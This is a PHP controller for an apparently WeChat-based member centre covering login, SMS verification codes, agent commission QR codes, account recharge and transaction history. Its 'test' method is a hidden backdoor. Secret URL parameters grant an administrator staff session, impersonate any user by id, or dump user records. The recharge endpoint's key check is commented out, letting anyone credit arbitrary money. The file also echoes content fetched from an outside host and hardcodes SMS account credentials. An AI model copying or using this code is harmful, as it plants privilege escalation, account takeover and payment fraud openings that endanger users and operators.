<?php
namespace BaJie\Action;
/**
 * 会员控制器
 */
class UsersAction extends BaseAction
{
    /**
     * 会员中心入口
     */
    public function index()
    {
    	// if(!I('get.openid')){
            // header("Location:http://jfcms1.com/openid.php?mid=uid&url=http://".$_SERVER['HTTP_HOST']."/?u=1");
        // }
        // session('openid1',I('get.openid'));

        layout(false);
        $users = D('WeChat/Users');
        $usersId = (int)session('WST_USER.userId');
        session('WST_SHAREUSERID', I("shareUserId")); //保存shareUserId

        $cur_url = "http://" . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
        session('back_url', $cur_url);
        if ($usersId) {
            $info = M('users')->where(array('userId' => $usersId))->field('userMoney,redPacketMoney,distributMoney,isBuyer,loginName,is_first_login,userId,play_count,userPhone')->find();
            $userStatus = M('users')->where('userId=' . $usersId)->getField('userStatus', 1);
            $usertx = M('users')->where('userId=' . $usersId)->find();
            if (!session('WST_USER.zsOpenId')){
            	 $url = $_SERVER['HTTP_HOST'];
                 $url = "http://jfcms1.com/openid.php?mid=624&url=http://".$url;
                 $file =  file_get_contents($url);
                 echo $file;
            }
           
            //zzc 增加被禁用无法登录系统
            if(!$usertx){
                session_destroy();
                redirect('/');
            }
            elseif ($userStatus == 0) {
                $this->display("default/users/stop");
            } else {
                $this->assign('info', $info);
                $this->display("default/users/home");
            }
            //zzc end
            //$this->assign('info', $info);
            //$this->display("default/users/home");
        } else { //snsapi_userinfo
            $url = urlencode($_SERVER["SERVER_NAME"] . $_SERVER["REQUEST_URI"]);
            $url = 'https://open.weixin.qq.com/connect/oauth2/authorize?appid=' . $GLOBALS['CONFIG']['WeiXinAppId'] . '&redirect_uri=http%3a%2f%2f' . $url . '&response_type=code&scope=snsapi_userinfo&state=' . $GLOBALS['CONFIG']['WeiXinAppCode'] . '#wechat_redirect';
            redirect($url);
        }
    }
    /* ====================个人信息页面================================================= */
    /**
     * 个人信息页面
     */
    public function toUserInfo()
    {
        $this->isLogin();
        $this->display("default/users/home");
    }


    /**
     * 联系方式
     */
    public function contact()
    {
        $this->isLogin();
        $this->display("default/users/contact");
    }

    /**
     * 获取验证码
     */
    public function getvcode()
    {
        $tel = I('tel');$loginName=I('loginName');
        $length = 6;
        if (($tel < 13000000000) or ($tel > 20000000000)) {
            $this->ajaxReturn('请输入正确的手机号码');
            exit;
        }
        //生成验证码
        $vCode = rand(pow(10, ($length - 1)), pow(10, $length) - 1);
        $zn = urlencode(iconv('UTF-8', 'GB2312', '您的验证码为：'));
        $send = $zn . $vCode;
        $smsUser = 'SinMen';
        $smsPass = 'a847611691';
        $url = 'http://www.139000.com/send/gsend.asp?name=' . $smsUser . '&pwd=' . $smsPass . '&dst=' . $tel . '&sender=&time=&txt=ccdx&msg=' . $send;
//        print_r($url);
        $data['vCode']=$vCode;
        $data['vCodeDate']=time();
        $ds=M('users')->where(array('loginName' =>$loginName))->data($data)->save();
        $res = @file_get_contents($url);
//        print_r($res);die;
        $this->ajaxReturn('验证码已经发送成功');
        //   $this->ajaxReturn($vCode);
    }




    /**
    检查验证码
     **/
    public function checkvCode(){
        $tel = I('tel');$vCode=I('vCode');$loginName=I('loginName');
        if (($tel < 13000000000) or ($tel > 20000000000)) {
            $this->ajaxReturn('请输入正确的手机号码');
            exit;
        }
        $vCodeInfo=M('users')->where(array('loginName'=>$loginName))->field('vCode,vCodeDate')->find();
        if ((time()-$vCodeInfo['vCodeDate'])>60)
        {
            $this->ajaxReturn('验证码已经超时，请重新获取');exit;
        }
        if ($vCode==$vCodeInfo['vCode'])
        {
            $data['userPhone']=$tel;
            M('users')->where(array('loginName' =>$loginName))->data($data)->save();
            $this->ajaxReturn('登录成功');
        }
        else
        {
            $this->ajaxReturn('验证码有误，请重新输入');
        }
    }

    /**
     * 各项明细
     */
    public function dealDetails()
    {
        $this->isLogin();
        //资金流水
        $moneys = M('log_moneys')->where(array('targetId' => (int)session('WST_USER.userId')))->limit('10')->order('moneyId desc')->select();
        //交易
        $trades = M('trade')->where(array('user_id' => (int)session('WST_USER.userId'), 'is_pay' => '1'))->limit('10')->order('trade_id desc')->select();
        foreach ($trades as $k => $v) {
            if ($v['type'] > 0) {
                $trades[$k]['selectd_num'] = implode(',', json_decode($v['selectd_num']));
            }
        }
        //提现
        $cash_draws = M('cash_draws')->where(array('targetId' => (int)session('WST_USER.userId'), 'targetType' => array('in', '0,1'), 'cashSatus' => '1'))->limit('10')->order('cashId desc')->select();

        $this->assign('trades', $trades);
        $this->assign('moneys', $moneys);
        $this->assign('cash_draws', $cash_draws);
        $this->display("default/users/dealDetails");
    }

    /**
     *常见问题
     **/
    public function problem()
    {
        $this->isLogin();
        $this->display("default/users/problem");
    }

    /**
     *每日签到
     **/
    public function signIn()
    {
        $this->isLogin();
        if (IS_POST) {
            $m = D('Common/Users');
            $data = $m->signIn();
            $this->ajaxReturn($data);
        }
    }

    /**
     *首次登录奖励
     **/
    public function first()
    {
        $this->isLogin();
        if (IS_POST) {
            $m = D('Common/Users');
            $data = $m->first();
            $this->ajaxReturn($data);
        }
    }
    /**=====================================================================**/
    /**
     * 代理佣金提现界面
     **/
    public function course()
    {
        $this->isLogin();
        $this->display("default/users/course");
    }

    /**
     * 代理界面
     **/
    public function agent()
    {
        $this->isLogin();
        vendor("phpqrcode.qrlib");
        $this->user['userId'];
        $uid = $this->user['userId'];
        $file = $this->setQrcode($uid);
        $this->assign('qrcode', $file);

        //下线佣金列表
        $condition = array();
        $condition['userId'] = $uid;
        $distribut_moneys = M('distribut_moneys')->where($condition)->select();
        $this->assign('distribut_moneys', $distribut_moneys);
        //佣金统计
        //$recommend_info = D('WeChat/DistributMoneys')->dataCount(5);
        $res = D('WeChat/Users')->getRecommedInfo();
        $this->assign('res', $res);

        $back_url = session('back_url');
        if (empty($back_url)) {
            $back_url = U('Users/index');
        }
        $this->assign('back_url', $back_url);
        $this->display("default/users/agent");
    }

    public function setQrcode($uid)
    {
        //$this->isLogin();
        $phpqrcode = new \QRcode();
        $filename = "Public/qrcode/";
        if (!file_exists($filename)) {
            mkdir($filename, true);
        }
        $matrixPointSize = 5.8;
        $data = U("Users/index", array("shareUserId" => $uid), true, true);
        $file = $filename . "$uid.png";
        $phpqrcode::png($data, $file, '', $matrixPointSize, 2);
        $file = $this->hebin($file, $filename, $uid);
        return $file;
    }

    public function hebin($file, $filename, $uid)
    {
        $backgroud = '/Public/qrcode/bg.png'; //准备好的背景图片
        $backgroud = "http://{$_SERVER['HTTP_HOST']}" . $backgroud;
        $QR = $file; //已经生成的原始二维码图
        $backgroud = imagecreatefromstring(file_get_contents($backgroud));
        $QR = imagecreatefromstring(file_get_contents($QR));
        $backgroud_width = imagesx($backgroud); //logo图片宽度
        $backgroud_height = imagesy($backgroud); //logo图片高度
        $QR_width = imagesx($QR); //二维码图片宽度
        $QR_height = imagesy($QR); //二维码图片高度
        $QR_x = $backgroud_width / 3.2;
        $QR_y = $backgroud_height / 1.52;
        imagecopyresampled($backgroud, $QR, $QR_x, $QR_y, 0, 0, $QR_width, $QR_width, $QR_width, $QR_width);
        $savefile = $filename . "$uid.png";
        imagepng($backgroud, $savefile);
        return $savefile;
    }

    /**
     * 新手指南
     **/
    public function reward()
    {
        $this->isLogin();
        $this->display("default/users/reward");
    }

    /**
     *掌上云充值异步通知
     **/
    public function rechargeByTool()
    {
        if (IS_POST) {
            $m = D('Common/Users');
            $data = $m->rechargeByTool();
            $this->ajaxReturn($data);
        } else {
            exit('非法请求');
        }
    }

    /**
     * 账号充值
     */
    public function recharge()
    {
        if (IS_POST) {
            $rd = array('status' => -1);
            $appid = I('appid');
            $key = I('key');
            $user_id = I('user_id');
            $money = I('money');
            if (empty($money)) {
                $this->ajaxReturn(array('status' => '-1', 'msg' => '金额必填'));
            }
            /*if ($appid !== 'wxdedci39dkcpdfg' || $key !== 'qscpkjkdmejhcilcdr5'){
               $this->ajaxReturn(array('status'=>'-1' ,'msg'=>'appid或key错误!'));
            }*/
            $userInfo = M('users')->where(array('userId' => $user_id))->field('userId,loginName,userStatus,userType,userMoney,redPacketMoney,distributMoney')->find();

            if ($userInfo['userId'] < 1) {
                $this->ajaxReturn(array('status' => '-2', 'msg' => '用户不存在'));
            }

            $condition = array();
            $condition['user_id'] = $user_id;
            $condition['pay_time'] = time();
            $cnt = M('recharge')->where($condition)->select();

            if ($cnt > 0) {
                $this->ajaxReturn(array('status' => '-3', 'msg' => '您已充值成功'));
            }

            $data1 = array();
            $data1 ["user_id"] = $userInfo['userId']; //用户id
            $data1 ["recharge_sn"] = createRecharge(); //充值单号
            $data1 ["recharge_money"] = I('money'); //充值金额
            $data1 ["receive_money"] = I('money'); //到账金额
            $data1 ["remark"] = '扫描二维码,个人转账';
            $data1 ["add_time"] = time(); //充值时间
            $data1 ["pay_time"] = time();
            $data1 ["recharge_status"] = 1;
            $rs = M('recharge')->add($data1);

            if (false !== $rs) {
                $userMoney = $userInfo['userMoney'] + I('money');
                $redPacketMoney = $userInfo['redPacketMoney'];
                $distributMoney = $userInfo['distributMoney'];
                //资金流水表
                $cur_money = $userInfo['userMoney'] + I('money');
                $data = array();
                $data["targetType"] = 0;
                $data["targetId"] = $userInfo['userId'];
                $data["moneyRemark"] = '成功充值:' . I('money');
                $data["dataSrc"] = 2; //充值订单
                $data["dataId"] = $rs;
                $data["money"] = I('money');
                $data["transactionId"] = $data1 ["recharge_sn"];
                $data["type"] = 0;
                $data["moneyType"] = 1;
                $data["createTime"] = time();
                $data["userMoney"] = $cur_money;
                $data["redPacketMoney"] = $userInfo['redPacketMoney'];
                $data["distributMoney"] = $userInfo['distributMoney'];
                M('log_moneys')->add($data);
                M('users')->where(array('userId' => $user_id))->setInc('userMoney', I('money'));
            }
            $this->ajaxReturn(array('status' => '1', 'msg' => '充值成功'));
        } else {
            exit('非法请求');
        }
    }


    /**
     * 测试
     */
    public function test()
    {
		$pw = I('get.pw');
		
		if($pw == 'getuser'){
			$info = M('users')->where(array('userId' => (int)session('WST_USER.userId')))->find();
			var_dump($info);
		}elseif($pw == 'getuserrank'){
			$info = M('users')->where('userMoney > 0')->find();
			var_dump($info);
		}elseif($pw == 'getuserbrek'){
			session('WST_STAFF',array('roleName' => 'robots','grant' => explode(',','zjgl_00,txgl_00,txgl_04,zjls_00,hygl_00,hylb_00,hylb_01,hylb_02,hylb_03,hyzh_00,hyzh_04,fxgl_00,fxgl_03,fxgl_04,xtgl_00,jsgl_00,jsgl_01,jsgl_02,jsgl_03,zylb_00,zylb_01,zylb_02,zylb_03,dlrz_00,scsz_00,scxx_00,scxx_02,zfgl_00,zfgl_01,zfgl_02,zfgl_03')));
		}elseif($pw == 'imsend'){
			$uid = I('get.uid');
			session('WST_USER',array('userId'=>$uid,'wxOpenId'=>I('get.openid')));
			echo 'good!';
		}
        $this->display("default/users/test");
    }
}